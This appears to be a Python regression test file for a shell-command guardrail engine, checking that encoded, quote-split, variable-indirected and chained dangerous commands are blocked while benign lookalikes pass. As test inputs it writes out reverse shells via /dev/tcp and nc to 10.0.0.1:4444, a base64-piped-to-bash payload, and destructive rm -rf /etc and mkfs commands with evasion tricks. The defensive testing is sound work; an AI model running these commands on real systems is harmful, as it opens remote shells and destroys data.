"""Stage 2 regression tests: evasion resistance and its limits.

These pin that decoded / de-obfuscated / chained payloads are caught, and -- just
as important -- that the new de-obfuscation does not turn benign commands that
merely *contain* dangerous-looking text into false positives.
"""
from __future__ import annotations

import base64
import unittest

from cybershell.models import Decision, ShellContext
from cybershell.policy import PolicyRegistry
from cybershell.risk import GuardrailEngine

REVERSE_SHELL = "sh -i >& /dev/tcp/10.0.0.1/4444 0>&1"
B64 = base64.b64encode(REVERSE_SHELL.encode()).decode()


class EvasionDetectionTests(unittest.TestCase):
    def setUp(self) -> None:
        self.engine = GuardrailEngine.packaged()
        self.policy = PolicyRegistry.packaged().get("soc")

    def decide(self, command: str, cwd: str = ".") -> Decision:
        ctx = ShellContext(partial_command=command, cwd=cwd)
        return self.engine.assess(command, ctx, self.policy).decision

    def test_base64_encoded_reverse_shell_blocks(self) -> None:
        for command in (
            f"echo {B64} | base64 -d | bash",
            f"echo {B64}|base64 --decode|sh",
            f"printf %s {B64} | base64 -d | bash",
        ):
            with self.subTest(command=command):
                self.assertEqual(self.decide(command), Decision.BLOCK)

    def test_quote_and_backslash_keyword_splitting_blocks(self) -> None:
        for command in ("r''m -rf /etc", r"r\m -rf /etc", "rm -r''f /etc", "''rm -rf /etc"):
            with self.subTest(command=command):
                self.assertEqual(self.decide(command), Decision.BLOCK)

    def test_variable_indirection_blocks(self) -> None:
        self.assertEqual(self.decide("a=rm; b=-rf; $a $b /etc"), Decision.BLOCK)
        self.assertEqual(self.decide("X=rm; ${X} -rf /usr"), Decision.BLOCK)

    def test_hex_escaped_command_blocks(self) -> None:
        self.assertEqual(self.decide(r"$'\x72\x6d' -rf /etc"), Decision.BLOCK)

    def test_chained_dangerous_command_blocks(self) -> None:
        for command in (
            "ls && rm -rf /etc",
            "echo hi; nc -e /bin/sh 10.0.0.1 4444",
            "true || mkfs.ext4 /dev/sda",
        ):
            with self.subTest(command=command):
                self.assertEqual(self.decide(command), Decision.BLOCK)

    def test_chained_rm_gets_target_aware_tiering(self) -> None:
        # The dangerous part is not the head command, yet it is still assessed.
        self.assertEqual(self.decide("cd /tmp && rm -rf /tmp/cache"), Decision.WARN)
        self.assertEqual(
            self.decide("make build && rm -rf node_modules", cwd="/home/u/proj"),
            Decision.ALLOW,
        )

    def test_encoded_block_is_explained(self) -> None:
        ctx = ShellContext(partial_command=f"echo {B64} | base64 -d | bash", cwd=".")
        assessment = self.engine.assess(ctx.partial_command, ctx, self.policy)
        rule_ids = {f.rule_id for f in assessment.findings}
        self.assertIn("shell.reverse_shell_tcp", rule_ids)
        self.assertIn("evasion.encoded_payload", rule_ids)


class BenignLookalikeTests(unittest.TestCase):
    """De-obfuscation must not flag commands that only mention dangerous text."""

    def setUp(self) -> None:
        self.engine = GuardrailEngine.packaged()
        self.policy = PolicyRegistry.packaged().get("soc")

    def decide(self, command: str, cwd: str = ".") -> Decision:
        ctx = ShellContext(partial_command=command, cwd=cwd)
        return self.engine.assess(command, ctx, self.policy).decision

    def test_quoted_dangerous_strings_are_allowed(self) -> None:
        for command in (
            'echo "rm -rf /"',
            "grep 'rm -rf /' /var/log/audit.log",
            "git commit -m 'remove -rf logic'",
            'echo "deploying to production"',
        ):
            with self.subTest(command=command):
                self.assertEqual(self.decide(command), Decision.ALLOW)

    def test_incidental_base64_argument_is_allowed(self) -> None:
        # Decodes to harmless ASCII -> no rule matches -> no escalation.
        self.assertEqual(
            self.decide("aws s3 cp s3://bucket/YWJjZGVmZ2hpamtsbW5vcA== ."),
            Decision.ALLOW,
        )

    def test_normal_pipelines_are_allowed(self) -> None:
        for command in ("ps aux | grep ssh", "cat access.log | wc -l", "ss -tulpn"):
            with self.subTest(command=command):
                self.assertEqual(self.decide(command), Decision.ALLOW)


if __name__ == "__main__":
    unittest.main()
